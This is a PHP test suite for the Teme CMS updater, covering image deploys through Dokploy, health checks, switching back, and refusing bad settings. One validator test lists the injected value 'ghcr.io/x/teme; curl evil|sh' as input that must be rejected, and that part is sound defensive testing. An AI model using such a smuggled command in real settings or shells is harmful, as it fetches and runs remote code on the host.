<?php

declare(strict_types=1);

use App\Domain\Backups\BackupLock;
use App\Domain\Updates\ImageName;
use App\Domain\Updates\Jobs\SendTemeUpdateEmails;
use App\Domain\Updates\Notifications\TemeUpdateNotice;
use App\Domain\Updates\Operations\Input\RequestTemeUpdateInput;
use App\Domain\Updates\Operations\RequestTemeUpdate;
use App\Domain\Updates\Queries\SiteQuiet;
use App\Domain\Updates\Queries\TemeUpdates;
use App\Domain\Updates\Requests\UpdateKind;
use App\Domain\Updates\TemeVersion;
use App\Domain\Updates\Updater\ComposeHash;
use App\Domain\Updates\Updater\NoPlatform;
use App\Domain\Updates\Updater\PartHealth;
use App\Domain\Updates\Updater\Platform;
use App\Domain\Updates\Updater\PlatformDeployment;
use App\Domain\Updates\Updater\PlatformRefused;
use App\Domain\Updates\Updater\UpdateRunner;
use Carbon\CarbonImmutable;
use Database\Seeders\RoleSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\Factory;
use Illuminate\Http\Client\Response;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Sleep;
use Illuminate\Support\Str;
use Tests\Fixtures\Updates\FakePlatform;

uses(RefreshDatabase::class);

const UR_IMAGE = 'ghcr.io/temecms/teme';

const UR_HASHES = 'https://templates.example.org/main/compose-hashes.json';

const UR_TEMPLATE = 'https://templates.example.org/main/blueprints/teme/docker-compose.yml';

beforeEach(function (): void {
    $this->seed(RoleSeeder::class);
    Notification::fake();
    Sleep::fake();
    updSite('0.1.0-rc.14', ['0.1.0-rc.15', '0.1.0-rc.14']);
    config([
        'teme.updater.image_repository' => UR_IMAGE,
        'teme.updater.deploy_timeout' => 3600,
        'teme.updater.part_timeout' => 900,
        'app.url' => 'https://example.org',
    ]);
    updOperator();

    $this->old = UR_IMAGE.':0.1.0-rc.14';
    $this->new = UR_IMAGE.':0.1.0-rc.15';
    $this->platform = new FakePlatform($this->old);
    app()->instance(Platform::class, $this->platform);
    $this->site = '0.1.0-rc.14';

    // The template's list of released compose files, and the file it serves: by default, the service's own file is current.
    config(['teme.updater.dokploy.compose_hashes_url' => UR_HASHES]);
    $this->hashes = fn (): Response|GuzzleHttp\Promise\PromiseInterface => Http::response(['format' => 1, 'current' => ComposeHash::of($this->platform->compose), 'released' => [ComposeHash::of($this->platform->compose)]]);
    $this->served = null;

    // GitHub's answer, the site's /up and the template's files, on a fresh client: a test may swap the list GitHub gives.
    $this->fakeHttp = function (array $releases): void {
        Http::swap(new Factory);
        updFake(Http::response(array_map(fn (string|array $release): array => is_array($release) ? updItem($release[0], $release[1]) : updItem($release), $releases), 200));
        Http::fake([
            'https://example.org/up' => fn () => Http::response('', $this->site === null ? 503 : 200, $this->site === null ? [] : ['X-Teme-Version' => $this->site]),
            UR_HASHES => fn () => ($this->hashes)(),
            UR_TEMPLATE => fn () => Http::response((string) $this->served, $this->served === null ? 404 : 200),
        ]);
    };
    ($this->fakeHttp)(['0.1.0-rc.15', '0.1.0-rc.14']);

    $this->request = fn (UpdateKind $kind = UpdateKind::Update, string $to = '0.1.0-rc.15'): string => (string) app(RequestTemeUpdate::class)->execute(new RequestTemeUpdateInput($to, $kind, null));
    $this->tick = fn () => app(UpdateRunner::class)->tick();
    $this->ticks = function (int $times): void {
        foreach (range(1, $times) as $ignored) {
            ($this->tick)();
        }
    };
    $this->deployRecorded = fn (string $version, int $exit = 0) => updDeployed($version, 0, [], $exit);
    $this->row = fn (): object => DB::table('teme_updates')->first();
    $this->states = fn (): array => array_column(json_decode((string) DB::table('teme_updates')->value('steps'), true), 'state', 'step');
    $this->entry = fn (string $step): array => collect(json_decode((string) DB::table('teme_updates')->value('steps'), true))->firstWhere('step', $step);
    $this->deployCalls = fn (): array => array_values(array_filter($this->platform->calls, fn (string $call): bool => str_starts_with($call, 'deploy ')));
    // Carries a request through to the moment $step has started, with the site answering the new release.
    $this->until = function (string $step): void {
        $this->site = '0.1.0-rc.15';
        ($this->tick)();
        ($this->deployRecorded)('0.1.0-rc.15');

        foreach (range(1, 40) as $ignored) {
            if (($this->states)()[$step] === 'started') {
                return;
            }

            ($this->tick)();
        }
    };
    $this->pushSteps = function (array $states, ?CarbonImmutable $startedAt = null): void {
        $steps = [];

        foreach (['deploy', 'web', 'worker', 'worker-long', 'scheduler', 'check', 'updater'] as $step) {
            $state = $states[$step] ?? 'pending';
            $steps[] = ['step' => $step, 'state' => $state, 'startedAt' => in_array($state, ['started', 'done'], true) ? ($startedAt ?? now())->toIso8601String() : null, 'finishedAt' => null, 'detail' => null, 'asks' => $state === 'started' ? 1 : 0, 'runsAfter' => null, 'mark' => null];
        }

        DB::table('teme_updates')->update(['status' => 'running', 'started_at' => now(), 'steps' => json_encode($steps)]);
    };
    // A job reserved by a worker, as the database queue records it.
    $this->reserveJob = fn () => DB::table('jobs')->insert(['queue' => 'default', 'payload' => '{}', 'attempts' => 1, 'reserved_at' => now()->timestamp, 'available_at' => now()->timestamp, 'created_at' => now()->timestamp]);
});

it('carries an update out with one deploy of the service, watches every part, then asks for the updater, and ends done', function (): void {
    ($this->request)();
    $this->site = '0.1.0-rc.15';
    ($this->tick)();                         // begins: GitHub asked afresh, TEME_IMAGE set, the service deployed
    ($this->deployRecorded)('0.1.0-rc.15');
    ($this->ticks)(20);                      // deploy done, web's three probes, the workers, the scheduler, the last check, the updater

    $row = ($this->row)();

    expect($row->status)->toBe('done')
        ->and($row->error)->toBeNull()
        ->and(array_values(($this->states)()))->toBe(['done', 'done', 'done', 'done', 'done', 'done', 'done'])
        ->and($this->platform->calls)->toBe([
            "setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15',
            "setImage TEME_UPDATER_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15, the updater',
        ]);
});

it('resumes after a crash mid-step without deploying twice', function (): void {
    ($this->request)();
    $this->site = '0.1.0-rc.15';
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15');
    ($this->ticks)(2);                       // deploy done, web started
    // A new process: nothing in memory survives but the row and the platform.
    app()->forgetInstance(UpdateRunner::class);
    ($this->ticks)(4);

    expect(($this->deployCalls)())->toBe(['deploy Teme 0.1.0-rc.15'])
        ->and(($this->states)()['web'])->toBe('done');
});

it('switches back with one deploy on the old image when web never answers with the new version', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15');
    $this->site = '0.1.0-rc.14';             // the old release still answers
    ($this->ticks)(2);                       // deploy done, web started
    $this->travel(16)->minutes();            // past web's 900 s
    ($this->ticks)(8);

    $row = ($this->row)();

    expect($row->status)->toBe('switched_back')
        ->and($row->error)->toBe('web didn’t answer its health check with Teme 0.1.0-rc.15 within 15 minutes.')
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old)
        ->and($this->platform->images['TEME_UPDATER_IMAGE'])->toBe($this->old)   // never moved
        ->and(array_slice($this->platform->calls, -2))->toBe(["setImage TEME_IMAGE {$this->old}", 'deploy Teme 0.1.0-rc.14, switched back'])
        ->and(($this->states)()['deploy'])->toBe('switched-back');
});

it('switches back, and ends failed with the backup named, when a migration fails', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15', 4);
    DB::table('deploy_runs')->where('version', '0.1.0-rc.15')->update(['backup_run_id' => '01backup', 'sentence' => 'A migration failed, so nothing was deployed.']);
    ($this->ticks)(8);

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('A migration failed, so nothing was deployed.')
        ->and($row->backup_run_id)->toBe('01backup')
        ->and($this->platform->images['TEME_UPDATER_IMAGE'])->toBe($this->old)
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old)
        ->and($this->platform->calls)->toBe([
            "setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15',
            "setImage TEME_IMAGE {$this->old}", 'deploy Teme 0.1.0-rc.14, switched back',
        ]);
});

it('switches back and ends failed when the platform’s deployment fails before the deploy records anything', function (): void {
    ($this->request)();
    $this->platform->outcome = 'error';
    ($this->tick)();
    ($this->ticks)(2);

    expect(($this->states)()['deploy'])->toBe('started');       // within the listing grace: nothing yet

    $this->travel(31)->seconds();
    $this->platform->outcome = 'done';
    ($this->ticks)(8);

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('The platform’s deployment of Teme 0.1.0-rc.15 ended in error before the deploy ran. See the service’s deployment log on the platform.')
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old);
});

it('treats a cancelled deployment as a lost job at the deploy step, never as a failure', function (): void {
    ($this->request)();
    $this->platform->outcome = 'cancelled';
    ($this->tick)();
    ($this->ticks)(3);

    expect(($this->states)()['deploy'])->toBe('started')
        ->and($this->platform->calls)->toHaveCount(2);

    $this->travel(31)->seconds();
    ($this->ticks)(3);                       // one more ask, once

    expect($this->platform->calls)->toHaveCount(4)->and(implode("\n", $this->platform->calls))->not->toContain('switched back');

    ($this->deployRecorded)('0.1.0-rc.15');  // the deploy ran on anyway
    ($this->tick)();

    expect(($this->states)()['deploy'])->toBe('done');
});

it('treats a cancelled deployment as a lost job at web: one more ask, then the time limit', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15');
    ($this->tick)();                         // deploy done
    $this->platform->deployments = [new PlatformDeployment('d2', 'cancelled', CarbonImmutable::now(), CarbonImmutable::now())];
    ($this->tick)();                         // web started
    ($this->ticks)(3);

    expect(($this->states)()['check'])->toBe('pending')->and($this->platform->calls)->toHaveCount(2);

    $this->travel(31)->seconds();
    $this->platform->outcome = 'cancelled';
    ($this->ticks)(3);

    expect($this->platform->calls)->toHaveCount(4)->and(($this->entry)('web')['asks'])->toBe(2);

    $this->travel(16)->minutes();
    ($this->tick)();

    expect(($this->states)()['check'])->toBe('failed')
        ->and(($this->entry)('check')['detail'])->toBe('web didn’t finish deploying within 15 minutes.');
});

it('asks the platform again once, and only once, when it lists nothing after the deploy', function (): void {
    ($this->request)();
    $this->platform->outcome = null;         // a job still queued, or lost
    ($this->tick)();

    foreach (range(1, 20) as $ignored) {
        ($this->tick)();
        $this->travel(5)->seconds();
    }

    expect($this->platform->calls)->toBe(["setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15', "setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15'])
        ->and(($this->entry)('deploy')['asks'])->toBe(2);

    $this->travel(61)->minutes();
    ($this->tick)();

    expect(($this->entry)('deploy')['state'])->toBe('failed')
        ->and(($this->entry)('deploy')['detail'])->toBe('The deploy didn’t record its end within an hour. See the service’s deployment log on the platform.');
});

it('never counts an old failed deploy run for the same version after asking again', function (): void {
    ($this->request)();
    ($this->tick)();
    $this->platform->outcome = null;
    $this->platform->deployments = [];
    updDeployed('0.1.0-rc.15', 10, [], 4);   // an earlier attempt, finished before this one began
    $steps = json_decode((string) DB::table('teme_updates')->value('steps'), true);
    $steps[0]['runsAfter'] = now()->subMinutes(5)->toIso8601String();
    $steps[0]['startedAt'] = now()->subSeconds(31)->toIso8601String();
    DB::table('teme_updates')->update(['steps' => json_encode($steps)]);
    $this->platform->calls = [];

    ($this->ticks)(3);                       // the second ask is made; the old row isn't this deploy's

    expect(($this->row)()->status)->toBe('running')
        ->and(($this->states)()['deploy'])->toBe('started')
        ->and($this->platform->calls)->toBe(["setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15']);

    updDeployed('0.1.0-rc.15', 0);           // a new run, exit 0
    ($this->tick)();

    expect(($this->states)()['deploy'])->toBe('done');
});

it('asks again once for web, and during the switch back, when the platform lists nothing', function (string $case): void {
    ($this->request)();
    ($this->tick)();
    $started = ['deploy' => 'done', 'web' => 'started'];
    $expected = ["setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15'];

    if ($case === 'switch back') {
        $started = ['deploy' => 'started', 'web' => 'failed', 'check' => 'failed'];
        $expected = ["setImage TEME_IMAGE {$this->old}", 'deploy Teme 0.1.0-rc.14, switched back'];
    }

    ($this->pushSteps)($started, now()->subSeconds(31));
    $this->platform->calls = [];
    $this->platform->deployments = [];
    $this->platform->outcome = null;

    foreach (range(1, 12) as $ignored) {
        ($this->tick)();
        $this->travel(5)->seconds();
    }

    expect($this->platform->calls)->toBe($expected);
})->with(['web', 'switch back']);

it('waits, and never deploys twice, when the platform hasn’t listed a deployment yet', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->pushSteps)(['deploy' => 'done', 'web' => 'started'], now()->subSeconds(5));
    $this->platform->calls = [];
    $this->platform->deployments = [];

    ($this->ticks)(3);

    expect($this->platform->calls)->toBe([]);
});

it('never counts the deployment it saw before asking, however close the clocks', function (): void {
    ($this->request)();
    $this->platform->outcome = 'error';
    ($this->until)('web');
    $forward = $this->platform->deployments[0];
    ($this->tick)();                           // web’s deployment ended in error: the switch back is marked
    $this->travel(2)->seconds();
    $this->platform->outcome = 'done';
    ($this->tick)();                           // the switch back asks

    $this->platform->deployments = [$forward]; // the platform hasn't listed the switch back's deployment yet
    ($this->ticks)(3);

    expect(($this->row)()->status)->toBe('running');

    $this->site = '0.1.0-rc.14';
    $this->platform->deployments = [new PlatformDeployment('listed', 'done', CarbonImmutable::now(), CarbonImmutable::now())];
    ($this->ticks)(10);

    expect(($this->row)()->status)->toBe('switched_back')
        ->and(($this->row)()->error)->toBe('web’s deployment ended in error on the platform.');
});

it('sets TEME_IMAGE back without deploying when the platform refused after saving it', function (): void {
    ($this->request)();
    $this->platform->refuseAfterSaving = new PlatformRefused('Dokploy answered 500 to compose.saveEnvironment.');

    ($this->tick)();

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('Dokploy answered 500 to compose.saveEnvironment.')
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old)
        ->and(($this->deployCalls)())->toBe([]);
});

it('switches back when setImage is refused on the second ask', function (): void {
    ($this->request)();
    ($this->tick)();
    $this->platform->outcome = null;
    $this->platform->deployments = [];
    $this->travel(31)->seconds();
    $this->platform->refuseAfterSaving = new PlatformRefused('Dokploy answered 500 to compose.saveEnvironment.');
    ($this->tick)();                           // the second ask: saved, then refused

    expect(($this->states)()['check'])->toBe('failed');

    $this->platform->outcome = 'done';
    $this->site = '0.1.0-rc.14';
    ($this->ticks)(6);

    expect(($this->row)()->status)->toBe('failed')
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old)
        ->and($this->platform->calls)->toContain('deploy Teme 0.1.0-rc.14, switched back');
});

it('never switches back on a refused read while the deploy may be migrating, and the deploy’s own record decides', function (): void {
    ($this->request)();
    $this->site = '0.1.0-rc.15';
    ($this->tick)();                           // the deploy asked
    $this->platform->refuse = new PlatformRefused('Teme couldn’t reach Dokploy at TEME_DOKPLOY_URL.');
    ($this->ticks)(3);                         // the panel restarts: nothing can be read

    expect(($this->row)()->status)->toBe('running')
        ->and(($this->states)()['deploy'])->toBe('started')
        ->and(($this->states)()['check'])->toBe('pending')
        ->and(($this->deployCalls)())->toBe(['deploy Teme 0.1.0-rc.15']);

    $this->platform->refuse = null;
    ($this->deployRecorded)('0.1.0-rc.15');
    ($this->ticks)(20);

    expect(($this->row)()->status)->toBe('done');
});

it('ends the deploy at the hour, and the switch back after 15 more minutes, when the platform stays unreadable', function (): void {
    ($this->request)();
    ($this->tick)();
    $this->platform->refuse = new PlatformRefused('Dokploy refused the token in TEME_DOKPLOY_TOKEN.');
    ($this->ticks)(3);
    $this->travel(61)->minutes();
    ($this->ticks)(3);                         // the hour: the deploy failed, the switch back waits on its read

    expect(($this->row)()->status)->toBe('running')
        ->and(($this->states)()['check'])->toBe('failed');

    $this->travel(16)->minutes();
    ($this->tick)();

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('Switching back to 0.1.0-rc.14 failed too: Dokploy refused the token in TEME_DOKPLOY_TOKEN. Set TEME_IMAGE back to 0.1.0-rc.14’s image by hand on the platform and deploy.')
        ->and(($this->deployCalls)())->toBe(['deploy Teme 0.1.0-rc.15']);
});

it('counts nothing at web for a refused read, and carries on when the platform answers again', function (): void {
    ($this->request)();
    ($this->until)('web');
    $this->platform->refuse = new PlatformRefused('Teme couldn’t reach Dokploy at TEME_DOKPLOY_URL.');
    ($this->ticks)(3);

    expect(($this->row)()->status)->toBe('running')
        ->and(($this->states)()['check'])->toBe('pending');

    $this->platform->refuse = null;
    ($this->ticks)(20);

    expect(($this->row)()->status)->toBe('done');
});

it('switches back when a part can’t be read for its 15 minutes', function (): void {
    ($this->request)();
    ($this->until)('web');
    $this->platform->refuse = new PlatformRefused('Teme couldn’t reach Dokploy at TEME_DOKPLOY_URL.');
    ($this->tick)();
    $this->travel(16)->minutes();
    ($this->tick)();

    expect(($this->states)()['check'])->toBe('failed')
        ->and(($this->entry)('check')['detail'])->toBe('Teme couldn’t check web within 15 minutes: Teme couldn’t reach Dokploy at TEME_DOKPLOY_URL.');
});

it('keeps waiting for the switch back through a refused read', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15');
    $this->site = '0.1.0-rc.14';
    ($this->ticks)(2);                         // deploy done, web started
    $this->travel(16)->minutes();
    ($this->ticks)(2);                         // web's time ran out; the switch back asked
    $this->platform->refuse = new PlatformRefused('Teme couldn’t reach Dokploy at TEME_DOKPLOY_URL.');
    ($this->ticks)(3);

    expect(($this->row)()->status)->toBe('running')
        ->and(($this->states)()['deploy'])->toBe('started');

    $this->platform->refuse = null;
    ($this->ticks)(8);

    expect(($this->row)()->status)->toBe('switched_back');
});

it('ends a request failed, changing nothing, when the platform refuses before anything was asked', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->pushSteps)([]);
    $this->platform->images['TEME_IMAGE'] = $this->old;
    $this->platform->calls = [];
    $this->platform->refuse = new PlatformRefused('Dokploy refused the token in TEME_DOKPLOY_TOKEN.');

    ($this->tick)();

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('Dokploy refused the token in TEME_DOKPLOY_TOKEN.')
        ->and($this->platform->calls)->toBe([]);
});

it('stops when the deploy records nothing within the hour', function (): void {
    ($this->request)();
    ($this->tick)();
    $this->travel(61)->minutes();
    ($this->ticks)(8);

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('The deploy didn’t record its end within an hour. See the service’s deployment log on the platform.')
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old);
});

it('waits for a backup or a job to finish before asking for the deploy', function (string $case): void {
    ($this->request)();

    if ($case === 'a reserved job') {
        ($this->reserveJob)();
    } else {
        DB::connectUsing('other_session', config('database.connections.'.config('database.default')), true);
        DB::connection('other_session')->select('SELECT pg_advisory_lock(hashtext(?))', [BackupLock::KEY]);
    }

    ($this->ticks)(3);

    expect($this->platform->calls)->toBe([])
        ->and(($this->states)()['deploy'])->toBe('pending')
        ->and(($this->entry)('deploy')['detail'])->toBe('Waiting for a backup or a job to finish first.');

    if ($case === 'a reserved job') {
        DB::table('jobs')->delete();
    } else {
        DB::connection('other_session')->select('SELECT pg_advisory_unlock(hashtext(?))', [BackupLock::KEY]);
    }

    ($this->tick)();

    expect($this->platform->calls)->toBe(["setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15'])
        ->and(($this->entry)('deploy')['detail'])->toBeNull();

    DB::purge('other_session');
})->with(['a reserved job', 'a backup']);

it('asks anyway after 15 minutes of waiting for quiet, saying so', function (): void {
    ($this->request)();
    ($this->reserveJob)();
    ($this->tick)();

    expect($this->platform->calls)->toBe([]);

    $this->travel(16)->minutes();
    ($this->tick)();

    expect($this->platform->calls)->toBe(["setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15'])
        ->and(($this->entry)('deploy')['detail'])->toBe('Asked while a backup or a job was still running; the site may be down longer.');
});

it('never waits for quiet to switch back', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->pushSteps)(['deploy' => 'done', 'web' => 'failed', 'check' => 'failed']);
    $this->platform->calls = [];
    ($this->reserveJob)();

    ($this->tick)();

    expect($this->platform->calls)->toBe(["setImage TEME_IMAGE {$this->old}", 'deploy Teme 0.1.0-rc.14, switched back']);
});

it('reports quiet only when no backup runs and no job is reserved', function (): void {
    expect(app(SiteQuiet::class)->isQuiet())->toBeTrue();

    ($this->reserveJob)();

    expect(app(SiteQuiet::class)->isQuiet())->toBeFalse();
});

it('waits, asking nothing, while another deployment of the service is running', function (): void {
    ($this->request)();
    $this->platform->deployments = [new PlatformDeployment('hand', 'running', CarbonImmutable::now(), null)];
    ($this->ticks)(3);

    expect($this->platform->calls)->toBe([])->and(($this->states)()['deploy'])->toBe('pending');

    $this->travel(16)->minutes();
    ($this->tick)();

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('Another deployment of the Compose service was still running after 15 minutes, so nothing was changed.')
        ->and($this->platform->calls)->toBe([]);
});

it('waits in the switch back for the forward deployment to end before asking', function (): void {
    ($this->request)();
    ($this->tick)();
    ($this->pushSteps)(['deploy' => 'done', 'web' => 'failed', 'check' => 'failed']);
    $this->platform->calls = [];
    $this->platform->deployments = [new PlatformDeployment('forward', 'running', CarbonImmutable::now(), null)];
    ($this->ticks)(3);

    expect($this->platform->calls)->toBe([]);

    $this->travel(16)->minutes();
    ($this->tick)();

    expect($this->platform->calls)->toBe(["setImage TEME_IMAGE {$this->old}", 'deploy Teme 0.1.0-rc.14, switched back']);
});

it('reads health at most once a pass', function (): void {
    ($this->request)();
    $this->site = '0.1.0-rc.15';
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15');

    foreach (range(1, 20) as $ignored) {
        $before = $this->platform->healthReads;
        ($this->tick)();

        expect($this->platform->healthReads - $before)->toBeLessThanOrEqual(1);
    }

    expect($this->platform->healthReads)->toBeGreaterThan(0);
});

it('switches back when a worker isn’t healthy in time, and waits while its health check is starting', function (): void {
    ($this->request)();
    ($this->until)('worker');
    $this->platform->health['worker'] = PartHealth::Starting;
    $calls = $this->platform->calls;
    ($this->ticks)(3);

    expect(($this->states)()['worker'])->toBe('started')->and($this->platform->calls)->toBe($calls);

    $this->platform->health['worker'] = PartHealth::Unhealthy;
    $this->travel(16)->minutes();
    $this->site = '0.1.0-rc.14';
    ($this->ticks)(8);

    $row = ($this->row)();

    expect($row->status)->toBe('switched_back')
        ->and($row->error)->toBe('worker wasn’t healthy on Teme 0.1.0-rc.15 within 15 minutes.');
});

it('switches back when the last check finds a part unhealthy, or the deployment not done', function (string $case): void {
    ($this->request)();
    ($this->until)('check');

    if ($case === 'a part unhealthy') {
        $this->platform->health['scheduler'] = PartHealth::Unhealthy;
        $this->travel(16)->minutes();
    } else {
        $this->platform->deployments = [new PlatformDeployment('late', 'error', CarbonImmutable::now(), CarbonImmutable::now())];
    }

    $this->site = '0.1.0-rc.14';
    ($this->ticks)(10);

    expect(($this->row)()->status)->toBe('switched_back')
        ->and(($this->row)()->error)->toBe('Not every part was running Teme 0.1.0-rc.15 at the last check.');
})->with(['a part unhealthy', 'a deployment not done']);

it('ends failed, saying so, when the switch back doesn’t settle in time', function (): void {
    ($this->request)();
    $this->platform->outcome = 'error';
    ($this->until)('web');
    ($this->tick)();
    $this->platform->outcome = 'running';
    ($this->ticks)(2);
    $this->travel(16)->minutes();
    ($this->ticks)(2);

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('Switching back to 0.1.0-rc.14 failed too: the service didn’t finish deploying within 15 minutes. Set TEME_IMAGE back to 0.1.0-rc.14’s image by hand on the platform and deploy.');
});

it('says the switch back failed too, and what to do, when the platform refuses it', function (): void {
    ($this->request)();
    ($this->until)('web');
    $this->site = '0.1.0-rc.14';
    $this->travel(16)->minutes();
    ($this->tick)();                           // web's time ran out: the switch back starts
    $this->platform->refuseDeploy = new PlatformRefused('Dokploy refused the token in TEME_DOKPLOY_TOKEN.');
    ($this->ticks)(2);

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('Switching back to 0.1.0-rc.14 failed too: Dokploy refused the token in TEME_DOKPLOY_TOKEN. Set TEME_IMAGE back to 0.1.0-rc.14’s image by hand on the platform and deploy.');
});

it('refuses before touching the platform', function (string $case, string $sentence): void {
    ($this->request)();

    match ($case) {
        'GitHub no longer lists it' => ($this->fakeHttp)(['0.1.0-rc.14']),
        'GitHub now marks it for maintenance' => ($this->fakeHttp)([updMarked('0.1.0-rc.15'), '0.1.0-rc.14']),
        'another version runs' => [config(['teme.version' => '0.1.0-rc.13']), $this->platform->images = array_map(fn (): string => UR_IMAGE.':0.1.0-rc.13', $this->platform->images)],
    };

    ($this->tick)();

    $row = ($this->row)();

    expect($row->status)->toBe('failed')->and($row->error)->toBe($sentence)->and($this->platform->calls)->toBe([]);
})->with([
    ['GitHub no longer lists it', 'GitHub no longer lists Teme 0.1.0-rc.15, so nothing was changed.'],
    ['GitHub now marks it for maintenance', 'Teme 0.1.0-rc.15 needs maintenance mode while it deploys, so this update is done by hand: see How to update.'],
    ['another version runs', 'This site runs Teme 0.1.0-rc.13 now, not 0.1.0-rc.14. Request the update again.'],
]);

it('refuses a repository setting that isn’t Teme’s image, before any call', function (string $repository): void {
    ($this->request)();
    config(['teme.updater.image_repository' => $repository]);

    ($this->tick)();

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('TEME_IMAGE_REPOSITORY must be Teme’s image on ghcr.io, such as ghcr.io/example/teme.')
        ->and($this->platform->calls)->toBe([]);
})->with(['ghcr.io/x/teme; curl evil|sh', 'docker.io/library/teme', 'ghcr.io/Owner/teme', '']);

it('ends a request failed, saying how to update by hand, when no platform is set up', function (): void {
    ($this->request)();
    app()->instance(Platform::class, new NoPlatform);

    ($this->tick)();

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('No platform is set up for the updater. Update by hand: see Tools › Updates, How to update.');
});

it('refuses before anything moves when an image setting isn’t on the old image', function (string $case, string $sentence): void {
    ($this->request)();

    match ($case) {
        'TEME_IMAGE' => $this->platform->images['TEME_IMAGE'] = UR_IMAGE.':0.1.0-rc.99',
        'TEME_UPDATER_IMAGE' => $this->platform->images['TEME_UPDATER_IMAGE'] = UR_IMAGE.':0.1.0-rc.99',
        'unset' => $this->platform->images = ['TEME_IMAGE' => $this->old],
    };

    ($this->tick)();

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe($sentence)
        ->and($row->error)->not->toContain('rc.99')
        ->and($this->platform->calls)->toBe([]);
})->with([
    ['TEME_IMAGE', 'TEME_IMAGE isn’t set to Teme 0.1.0-rc.14’s image on the platform, so nothing was changed. Set it to 0.1.0-rc.14’s image first.'],
    ['TEME_UPDATER_IMAGE', 'TEME_UPDATER_IMAGE isn’t set to Teme 0.1.0-rc.14’s image on the platform, so nothing was changed. Set it to 0.1.0-rc.14’s image first.'],
    ['unset', 'TEME_UPDATER_IMAGE isn’t set to Teme 0.1.0-rc.14’s image on the platform, so nothing was changed. Set it to 0.1.0-rc.14’s image first.'],
]);

it('re-checks every rule at begin, for a roll back too', function (string $case, string $sentence): void {
    Http::swap(new Factory);
    updSite('0.1.0-rc.14', ['0.1.0-rc.15', '0.1.0-rc.14', '0.1.0-rc.13']);
    ($this->fakeHttp)(['0.1.0-rc.15', '0.1.0-rc.14', '0.1.0-rc.13']);
    updOperator();

    if ($case === 'a maintenance migration ran since') {
        updDeployed('0.1.0-rc.13', 600);
        DB::table('deploy_runs')->where('version', '0.1.0-rc.14')->update(['report' => json_encode(['migrations' => ['ran' => ['x'], 'needs_maintenance' => ['x']]])]);
    }

    DB::table('teme_updates')->insert([
        'id' => strtolower((string) Str::ulid()), 'kind' => 'rollback', 'from_version' => '0.1.0-rc.14', 'to_version' => '0.1.0-rc.13',
        'status' => 'requested', 'steps' => '[]', 'requested_at' => now(),
    ]);

    ($this->tick)();

    expect(($this->row)()->status)->toBe('failed')->and(($this->row)()->error)->toBe($sentence)->and($this->platform->calls)->toBe([]);
})->with([
    ['it is no longer the previous release', 'Teme 0.1.0-rc.13 isn’t the release this site ran before, so it can’t be rolled back to.'],
    ['a maintenance migration ran since', 'A migration since Teme 0.1.0-rc.13 can’t run beside it, so rolling back needs a restore: see How to update.'],
]);

it('keeps an update done when the updater can’t be asked to restart', function (string $case): void {
    Queue::fake();
    ($this->request)();
    ($this->tick)();
    ($this->pushSteps)(['deploy' => 'done', 'web' => 'done', 'worker' => 'done', 'worker-long' => 'done', 'scheduler' => 'done', 'check' => 'done']);
    $this->platform->calls = [];

    match ($case) {
        'setImage refused' => $this->platform->refuse = new PlatformRefused('Dokploy answered 500 to compose.one.'),
        'deploy refused' => $this->platform->refuseDeploy = new PlatformRefused('Dokploy answered 500 to compose.deploy.'),
    };

    ($this->ticks)(3);

    $updater = collect(json_decode((string) DB::table('teme_updates')->value('steps'), true))->firstWhere('step', 'updater');

    expect(($this->row)()->status)->toBe('done')
        ->and($updater['state'])->toBe('failed')
        ->and($updater['detail'])->toBe('The updater couldn’t be asked to restart on Teme 0.1.0-rc.15, so it still runs 0.1.0-rc.14. Set TEME_UPDATER_IMAGE to Teme 0.1.0-rc.15’s image on the platform and deploy.')
        ->and(implode("\n", $this->platform->calls))->not->toContain('switched back');
    Queue::assertPushed(SendTemeUpdateEmails::class, fn (SendTemeUpdateEmails $job): bool => $job->kind === TemeUpdateNotice::DONE);
})->with(['setImage refused', 'deploy refused']);

it('ends the update done when it finds the updater step failed after a crash', function (): void {
    ($this->request)();
    ($this->tick)();
